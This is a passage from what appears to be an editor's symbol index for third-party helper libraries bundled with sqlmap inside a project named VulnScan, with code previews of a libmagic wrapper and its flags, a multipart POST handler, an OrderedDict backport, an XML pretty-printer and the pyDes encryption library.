        "peekOfCode": "DEBUG = None\nimport sys\nif sys.version_info < (2, 4): HANDLE_ERRORS = 1\nelse: HANDLE_ERRORS = 0\nclass ConnectionManager:\n    \"\"\"\n    The connection manager must be able to:\n      * keep track of all existing\n      \"\"\"\n    def __init__(self):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.keepalive.keepalive",
        "documentation": {}
    },
    {
        "label": "MagicException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "class MagicException(Exception):\n    pass\nclass Magic:\n    \"\"\"\n    Magic is a wrapper around the libmagic C library.\n    \"\"\"\n    def __init__(self, mime=False, magic_file=None, mime_encoding=False):\n        \"\"\"\n        Create a new libmagic wrapper.\n        mime - if True, mimetypes are returned instead of textual descriptions",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "Magic",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "class Magic:\n    \"\"\"\n    Magic is a wrapper around the libmagic C library.\n    \"\"\"\n    def __init__(self, mime=False, magic_file=None, mime_encoding=False):\n        \"\"\"\n        Create a new libmagic wrapper.\n        mime - if True, mimetypes are returned instead of textual descriptions\n        mime_encoding - if True, codec is returned\n        magic_file - use a mime database other than the system default",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "from_file",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "def from_file(filename, mime=False):\n    m = _get_magic_type(mime)\n    return m.from_file(filename)\ndef from_buffer(buffer, mime=False):\n    m = _get_magic_type(mime)\n    return m.from_buffer(buffer)\ntry:\n    libmagic = None\n    import ctypes\n    import ctypes.util",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "from_buffer",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "def from_buffer(buffer, mime=False):\n    m = _get_magic_type(mime)\n    return m.from_buffer(buffer)\ntry:\n    libmagic = None\n    import ctypes\n    import ctypes.util\n    from ctypes import c_char_p, c_int, c_size_t, c_void_p\n    # Let's try to find magic or magic1\n    dll = ctypes.util.find_library('magic') or ctypes.util.find_library('magic1')",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "_magic_mime",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "_magic_mime = None\n_magic = None\ndef _get_magic_mime():\n    global _magic_mime\n    if not _magic_mime:\n        _magic_mime = Magic(mime=True)\n    return _magic_mime\ndef _get_magic():\n    global _magic\n    if not _magic:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "_magic",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "_magic = None\ndef _get_magic_mime():\n    global _magic_mime\n    if not _magic_mime:\n        _magic_mime = Magic(mime=True)\n    return _magic_mime\ndef _get_magic():\n    global _magic\n    if not _magic:\n        _magic = Magic()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_NONE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_NONE = 0x000000 # No flags\nMAGIC_DEBUG = 0x000001 # Turn on debugging\nMAGIC_SYMLINK = 0x000002 # Follow symlinks\nMAGIC_COMPRESS = 0x000004 # Check inside compressed files\nMAGIC_DEVICES = 0x000008 # Look at the contents of devices\nMAGIC_MIME = 0x000010 # Return a mime string\nMAGIC_MIME_ENCODING = 0x000400 # Return the MIME encoding\nMAGIC_CONTINUE = 0x000020 # Return all matches\nMAGIC_CHECK = 0x000040 # Print warnings to stderr\nMAGIC_PRESERVE_ATIME = 0x000080 # Restore access time on exit",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_DEBUG",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_DEBUG = 0x000001 # Turn on debugging\nMAGIC_SYMLINK = 0x000002 # Follow symlinks\nMAGIC_COMPRESS = 0x000004 # Check inside compressed files\nMAGIC_DEVICES = 0x000008 # Look at the contents of devices\nMAGIC_MIME = 0x000010 # Return a mime string\nMAGIC_MIME_ENCODING = 0x000400 # Return the MIME encoding\nMAGIC_CONTINUE = 0x000020 # Return all matches\nMAGIC_CHECK = 0x000040 # Print warnings to stderr\nMAGIC_PRESERVE_ATIME = 0x000080 # Restore access time on exit\nMAGIC_RAW = 0x000100 # Don't translate unprintable chars",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_SYMLINK",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_SYMLINK = 0x000002 # Follow symlinks\nMAGIC_COMPRESS = 0x000004 # Check inside compressed files\nMAGIC_DEVICES = 0x000008 # Look at the contents of devices\nMAGIC_MIME = 0x000010 # Return a mime string\nMAGIC_MIME_ENCODING = 0x000400 # Return the MIME encoding\nMAGIC_CONTINUE = 0x000020 # Return all matches\nMAGIC_CHECK = 0x000040 # Print warnings to stderr\nMAGIC_PRESERVE_ATIME = 0x000080 # Restore access time on exit\nMAGIC_RAW = 0x000100 # Don't translate unprintable chars\nMAGIC_ERROR = 0x000200 # Handle ENOENT etc as real errors",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_COMPRESS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_COMPRESS = 0x000004 # Check inside compressed files\nMAGIC_DEVICES = 0x000008 # Look at the contents of devices\nMAGIC_MIME = 0x000010 # Return a mime string\nMAGIC_MIME_ENCODING = 0x000400 # Return the MIME encoding\nMAGIC_CONTINUE = 0x000020 # Return all matches\nMAGIC_CHECK = 0x000040 # Print warnings to stderr\nMAGIC_PRESERVE_ATIME = 0x000080 # Restore access time on exit\nMAGIC_RAW = 0x000100 # Don't translate unprintable chars\nMAGIC_ERROR = 0x000200 # Handle ENOENT etc as real errors\nMAGIC_NO_CHECK_COMPRESS = 0x001000 # Don't check for compressed files",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_DEVICES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_DEVICES = 0x000008 # Look at the contents of devices\nMAGIC_MIME = 0x000010 # Return a mime string\nMAGIC_MIME_ENCODING = 0x000400 # Return the MIME encoding\nMAGIC_CONTINUE = 0x000020 # Return all matches\nMAGIC_CHECK = 0x000040 # Print warnings to stderr\nMAGIC_PRESERVE_ATIME = 0x000080 # Restore access time on exit\nMAGIC_RAW = 0x000100 # Don't translate unprintable chars\nMAGIC_ERROR = 0x000200 # Handle ENOENT etc as real errors\nMAGIC_NO_CHECK_COMPRESS = 0x001000 # Don't check for compressed files\nMAGIC_NO_CHECK_TAR = 0x002000 # Don't check for tar files",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_MIME",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_MIME = 0x000010 # Return a mime string\nMAGIC_MIME_ENCODING = 0x000400 # Return the MIME encoding\nMAGIC_CONTINUE = 0x000020 # Return all matches\nMAGIC_CHECK = 0x000040 # Print warnings to stderr\nMAGIC_PRESERVE_ATIME = 0x000080 # Restore access time on exit\nMAGIC_RAW = 0x000100 # Don't translate unprintable chars\nMAGIC_ERROR = 0x000200 # Handle ENOENT etc as real errors\nMAGIC_NO_CHECK_COMPRESS = 0x001000 # Don't check for compressed files\nMAGIC_NO_CHECK_TAR = 0x002000 # Don't check for tar files\nMAGIC_NO_CHECK_SOFT = 0x004000 # Don't check magic entries",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_MIME_ENCODING",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_MIME_ENCODING = 0x000400 # Return the MIME encoding\nMAGIC_CONTINUE = 0x000020 # Return all matches\nMAGIC_CHECK = 0x000040 # Print warnings to stderr\nMAGIC_PRESERVE_ATIME = 0x000080 # Restore access time on exit\nMAGIC_RAW = 0x000100 # Don't translate unprintable chars\nMAGIC_ERROR = 0x000200 # Handle ENOENT etc as real errors\nMAGIC_NO_CHECK_COMPRESS = 0x001000 # Don't check for compressed files\nMAGIC_NO_CHECK_TAR = 0x002000 # Don't check for tar files\nMAGIC_NO_CHECK_SOFT = 0x004000 # Don't check magic entries\nMAGIC_NO_CHECK_APPTYPE = 0x008000 # Don't check application type",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_CONTINUE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_CONTINUE = 0x000020 # Return all matches\nMAGIC_CHECK = 0x000040 # Print warnings to stderr\nMAGIC_PRESERVE_ATIME = 0x000080 # Restore access time on exit\nMAGIC_RAW = 0x000100 # Don't translate unprintable chars\nMAGIC_ERROR = 0x000200 # Handle ENOENT etc as real errors\nMAGIC_NO_CHECK_COMPRESS = 0x001000 # Don't check for compressed files\nMAGIC_NO_CHECK_TAR = 0x002000 # Don't check for tar files\nMAGIC_NO_CHECK_SOFT = 0x004000 # Don't check magic entries\nMAGIC_NO_CHECK_APPTYPE = 0x008000 # Don't check application type\nMAGIC_NO_CHECK_ELF = 0x010000 # Don't check for elf details",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_CHECK",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_CHECK = 0x000040 # Print warnings to stderr\nMAGIC_PRESERVE_ATIME = 0x000080 # Restore access time on exit\nMAGIC_RAW = 0x000100 # Don't translate unprintable chars\nMAGIC_ERROR = 0x000200 # Handle ENOENT etc as real errors\nMAGIC_NO_CHECK_COMPRESS = 0x001000 # Don't check for compressed files\nMAGIC_NO_CHECK_TAR = 0x002000 # Don't check for tar files\nMAGIC_NO_CHECK_SOFT = 0x004000 # Don't check magic entries\nMAGIC_NO_CHECK_APPTYPE = 0x008000 # Don't check application type\nMAGIC_NO_CHECK_ELF = 0x010000 # Don't check for elf details\nMAGIC_NO_CHECK_ASCII = 0x020000 # Don't check for ascii files",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_PRESERVE_ATIME",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_PRESERVE_ATIME = 0x000080 # Restore access time on exit\nMAGIC_RAW = 0x000100 # Don't translate unprintable chars\nMAGIC_ERROR = 0x000200 # Handle ENOENT etc as real errors\nMAGIC_NO_CHECK_COMPRESS = 0x001000 # Don't check for compressed files\nMAGIC_NO_CHECK_TAR = 0x002000 # Don't check for tar files\nMAGIC_NO_CHECK_SOFT = 0x004000 # Don't check magic entries\nMAGIC_NO_CHECK_APPTYPE = 0x008000 # Don't check application type\nMAGIC_NO_CHECK_ELF = 0x010000 # Don't check for elf details\nMAGIC_NO_CHECK_ASCII = 0x020000 # Don't check for ascii files\nMAGIC_NO_CHECK_TROFF = 0x040000 # Don't check ascii/troff",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_RAW",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_RAW = 0x000100 # Don't translate unprintable chars\nMAGIC_ERROR = 0x000200 # Handle ENOENT etc as real errors\nMAGIC_NO_CHECK_COMPRESS = 0x001000 # Don't check for compressed files\nMAGIC_NO_CHECK_TAR = 0x002000 # Don't check for tar files\nMAGIC_NO_CHECK_SOFT = 0x004000 # Don't check magic entries\nMAGIC_NO_CHECK_APPTYPE = 0x008000 # Don't check application type\nMAGIC_NO_CHECK_ELF = 0x010000 # Don't check for elf details\nMAGIC_NO_CHECK_ASCII = 0x020000 # Don't check for ascii files\nMAGIC_NO_CHECK_TROFF = 0x040000 # Don't check ascii/troff\nMAGIC_NO_CHECK_FORTRAN = 0x080000 # Don't check ascii/fortran",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_ERROR",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_ERROR = 0x000200 # Handle ENOENT etc as real errors\nMAGIC_NO_CHECK_COMPRESS = 0x001000 # Don't check for compressed files\nMAGIC_NO_CHECK_TAR = 0x002000 # Don't check for tar files\nMAGIC_NO_CHECK_SOFT = 0x004000 # Don't check magic entries\nMAGIC_NO_CHECK_APPTYPE = 0x008000 # Don't check application type\nMAGIC_NO_CHECK_ELF = 0x010000 # Don't check for elf details\nMAGIC_NO_CHECK_ASCII = 0x020000 # Don't check for ascii files\nMAGIC_NO_CHECK_TROFF = 0x040000 # Don't check ascii/troff\nMAGIC_NO_CHECK_FORTRAN = 0x080000 # Don't check ascii/fortran\nMAGIC_NO_CHECK_TOKENS = 0x100000 # Don't check ascii/tokens",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_NO_CHECK_COMPRESS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_NO_CHECK_COMPRESS = 0x001000 # Don't check for compressed files\nMAGIC_NO_CHECK_TAR = 0x002000 # Don't check for tar files\nMAGIC_NO_CHECK_SOFT = 0x004000 # Don't check magic entries\nMAGIC_NO_CHECK_APPTYPE = 0x008000 # Don't check application type\nMAGIC_NO_CHECK_ELF = 0x010000 # Don't check for elf details\nMAGIC_NO_CHECK_ASCII = 0x020000 # Don't check for ascii files\nMAGIC_NO_CHECK_TROFF = 0x040000 # Don't check ascii/troff\nMAGIC_NO_CHECK_FORTRAN = 0x080000 # Don't check ascii/fortran\nMAGIC_NO_CHECK_TOKENS = 0x100000 # Don't check ascii/tokens\nMAGIC_UNKNOWN_FILETYPE = b\"unknown\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_NO_CHECK_TAR",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_NO_CHECK_TAR = 0x002000 # Don't check for tar files\nMAGIC_NO_CHECK_SOFT = 0x004000 # Don't check magic entries\nMAGIC_NO_CHECK_APPTYPE = 0x008000 # Don't check application type\nMAGIC_NO_CHECK_ELF = 0x010000 # Don't check for elf details\nMAGIC_NO_CHECK_ASCII = 0x020000 # Don't check for ascii files\nMAGIC_NO_CHECK_TROFF = 0x040000 # Don't check ascii/troff\nMAGIC_NO_CHECK_FORTRAN = 0x080000 # Don't check ascii/fortran\nMAGIC_NO_CHECK_TOKENS = 0x100000 # Don't check ascii/tokens\nMAGIC_UNKNOWN_FILETYPE = b\"unknown\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_NO_CHECK_SOFT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_NO_CHECK_SOFT = 0x004000 # Don't check magic entries\nMAGIC_NO_CHECK_APPTYPE = 0x008000 # Don't check application type\nMAGIC_NO_CHECK_ELF = 0x010000 # Don't check for elf details\nMAGIC_NO_CHECK_ASCII = 0x020000 # Don't check for ascii files\nMAGIC_NO_CHECK_TROFF = 0x040000 # Don't check ascii/troff\nMAGIC_NO_CHECK_FORTRAN = 0x080000 # Don't check ascii/fortran\nMAGIC_NO_CHECK_TOKENS = 0x100000 # Don't check ascii/tokens\nMAGIC_UNKNOWN_FILETYPE = b\"unknown\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_NO_CHECK_APPTYPE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_NO_CHECK_APPTYPE = 0x008000 # Don't check application type\nMAGIC_NO_CHECK_ELF = 0x010000 # Don't check for elf details\nMAGIC_NO_CHECK_ASCII = 0x020000 # Don't check for ascii files\nMAGIC_NO_CHECK_TROFF = 0x040000 # Don't check ascii/troff\nMAGIC_NO_CHECK_FORTRAN = 0x080000 # Don't check ascii/fortran\nMAGIC_NO_CHECK_TOKENS = 0x100000 # Don't check ascii/tokens\nMAGIC_UNKNOWN_FILETYPE = b\"unknown\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_NO_CHECK_ELF",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_NO_CHECK_ELF = 0x010000 # Don't check for elf details\nMAGIC_NO_CHECK_ASCII = 0x020000 # Don't check for ascii files\nMAGIC_NO_CHECK_TROFF = 0x040000 # Don't check ascii/troff\nMAGIC_NO_CHECK_FORTRAN = 0x080000 # Don't check ascii/fortran\nMAGIC_NO_CHECK_TOKENS = 0x100000 # Don't check ascii/tokens\nMAGIC_UNKNOWN_FILETYPE = b\"unknown\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_NO_CHECK_ASCII",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_NO_CHECK_ASCII = 0x020000 # Don't check for ascii files\nMAGIC_NO_CHECK_TROFF = 0x040000 # Don't check ascii/troff\nMAGIC_NO_CHECK_FORTRAN = 0x080000 # Don't check ascii/fortran\nMAGIC_NO_CHECK_TOKENS = 0x100000 # Don't check ascii/tokens\nMAGIC_UNKNOWN_FILETYPE = b\"unknown\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_NO_CHECK_TROFF",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_NO_CHECK_TROFF = 0x040000 # Don't check ascii/troff\nMAGIC_NO_CHECK_FORTRAN = 0x080000 # Don't check ascii/fortran\nMAGIC_NO_CHECK_TOKENS = 0x100000 # Don't check ascii/tokens\nMAGIC_UNKNOWN_FILETYPE = b\"unknown\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_NO_CHECK_FORTRAN",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_NO_CHECK_FORTRAN = 0x080000 # Don't check ascii/fortran\nMAGIC_NO_CHECK_TOKENS = 0x100000 # Don't check ascii/tokens\nMAGIC_UNKNOWN_FILETYPE = b\"unknown\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_NO_CHECK_TOKENS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_NO_CHECK_TOKENS = 0x100000 # Don't check ascii/tokens\nMAGIC_UNKNOWN_FILETYPE = b\"unknown\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MAGIC_UNKNOWN_FILETYPE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "description": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "peekOfCode": "MAGIC_UNKNOWN_FILETYPE = b\"unknown\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.magic.magic",
        "documentation": {}
    },
    {
        "label": "MultipartPostHandler",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.multipart.multipartpost",
        "description": "VulnScan.modules.sqlmap.thirdparty.multipart.multipartpost",
        "peekOfCode": "class MultipartPostHandler(_urllib.request.BaseHandler):\n    handler_order = _urllib.request.HTTPHandler.handler_order - 10 # needs to run first\n    def http_request(self, request):\n        data = request.data\n        if isinstance(data, dict):\n            v_files = []\n            v_vars = []\n            try:\n                for(key, value) in data.items():\n                    if hasattr(value, \"fileno\") or hasattr(value, \"file\") or isinstance(value, io.IOBase):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.multipart.multipartpost",
        "documentation": {}
    },
    {
        "label": "doseq",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.multipart.multipartpost",
        "description": "VulnScan.modules.sqlmap.thirdparty.multipart.multipartpost",
        "peekOfCode": "doseq = 1\nclass MultipartPostHandler(_urllib.request.BaseHandler):\n    handler_order = _urllib.request.HTTPHandler.handler_order - 10 # needs to run first\n    def http_request(self, request):\n        data = request.data\n        if isinstance(data, dict):\n            v_files = []\n            v_vars = []\n            try:\n                for(key, value) in data.items():",
        "detail": "VulnScan.modules.sqlmap.thirdparty.multipart.multipartpost",
        "documentation": {}
    },
    {
        "label": "OrderedDict",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.odict.ordereddict",
        "description": "VulnScan.modules.sqlmap.thirdparty.odict.ordereddict",
        "peekOfCode": "class OrderedDict(dict, DictMixin):\n    def __init__(self, *args, **kwds):\n        if len(args) > 1:\n            raise TypeError('expected at most 1 arguments, got %d' % len(args))\n        try:\n            self.__end\n        except AttributeError:\n            self.clear()\n        self.update(*args, **kwds)\n    def clear(self):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.odict.ordereddict",
        "documentation": {}
    },
    {
        "label": "format",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.prettyprint.prettyprint",
        "description": "VulnScan.modules.sqlmap.thirdparty.prettyprint.prettyprint",
        "peekOfCode": "def format(text):\n        doc = minidom.parseString(text)\n        root = doc.childNodes[0]\n        return root.toprettyxml(indent='  ')\ndef formatXML(doc, encoding=None):\n        root = doc.childNodes[0]\n        return root.toprettyxml(indent='  ', encoding=encoding)\ndef _patch_minidom():\n        minidom.Text.writexml = _writexml_text\n        minidom.Element.writexml = _writexml_element",
        "detail": "VulnScan.modules.sqlmap.thirdparty.prettyprint.prettyprint",
        "documentation": {}
    },
    {
        "label": "formatXML",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.prettyprint.prettyprint",
        "description": "VulnScan.modules.sqlmap.thirdparty.prettyprint.prettyprint",
        "peekOfCode": "def formatXML(doc, encoding=None):\n        root = doc.childNodes[0]\n        return root.toprettyxml(indent='  ', encoding=encoding)\ndef _patch_minidom():\n        minidom.Text.writexml = _writexml_text\n        minidom.Element.writexml = _writexml_element\n        minidom.Node.toprettyxml = _toprettyxml_node\ndef _collapse(node):\n        for child in node.childNodes:\n                if child.nodeType == Node.TEXT_NODE and len(child.data.strip()) == 0:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.prettyprint.prettyprint",
        "documentation": {}
    },
    {
        "label": "_baseDes",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "class _baseDes(object):\n\tdef __init__(self, mode=ECB, IV=None, pad=None, padmode=PAD_NORMAL):\n\t\tif IV:\n\t\t\tIV = self._guardAgainstUnicode(IV)\n\t\tif pad:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tself.block_size = 8\n\t\t# Sanity checking of arguments.\n\t\tif pad and padmode == PAD_PKCS5:\n\t\t\traise ValueError(\"Cannot use a pad character with PAD_PKCS5\")",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "des",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "class des(_baseDes):\n\t\"\"\"DES encryption/decrytpion class\n\tSupports ECB (Electronic Code Book) and CBC (Cypher Block Chaining) modes.\n\tpyDes.des(key,[mode], [IV])\n\tkey  -> Bytes containing the encryption key, must be exactly 8 bytes\n\tmode -> Optional argument for encryption type, can be either pyDes.ECB\n\t\t(Electronic Code Book), pyDes.CBC (Cypher Block Chaining)\n\tIV   -> Optional Initial Value bytes, must be supplied if using CBC mode.\n\t\tMust be 8 bytes in length.\n\tpad  -> Optional argument, set the pad character (PAD_NORMAL) to use",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "triple_des",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "class triple_des(_baseDes):\n\t\"\"\"Triple DES encryption/decrytpion class\n\tThis algorithm uses the DES-EDE3 (when a 24 byte key is supplied) or\n\tthe DES-EDE2 (when a 16 byte key is supplied) encryption methods.\n\tSupports ECB (Electronic Code Book) and CBC (Cypher Block Chaining) modes.\n\tpyDes.des(key, [mode], [IV])\n\tkey  -> Bytes containing the encryption key, must be either 16 or\n\t        24 bytes long\n\tmode -> Optional argument for encryption type, can be either pyDes.ECB\n\t\t(Electronic Code Book), pyDes.CBC (Cypher Block Chaining)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "data",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "data = \"Please encrypt my data\"\nk = des(\"DESCRYPT\", CBC, \"\\0\\0\\0\\0\\0\\0\\0\\0\", pad=None, padmode=PAD_PKCS5)\n# For Python3, you'll need to use bytes, i.e.:\n#   data = b\"Please encrypt my data\"\n#   k = des(b\"DESCRYPT\", CBC, b\"\\0\\0\\0\\0\\0\\0\\0\\0\", pad=None, padmode=PAD_PKCS5)\nd = k.encrypt(data)\nprint \"Encrypted: %r\" % d\nprint \"Decrypted: %r\" % k.decrypt(d)\nassert k.decrypt(d, padmode=PAD_PKCS5) == data\nSee the module source (pyDes.py) for more examples of use.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "k",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
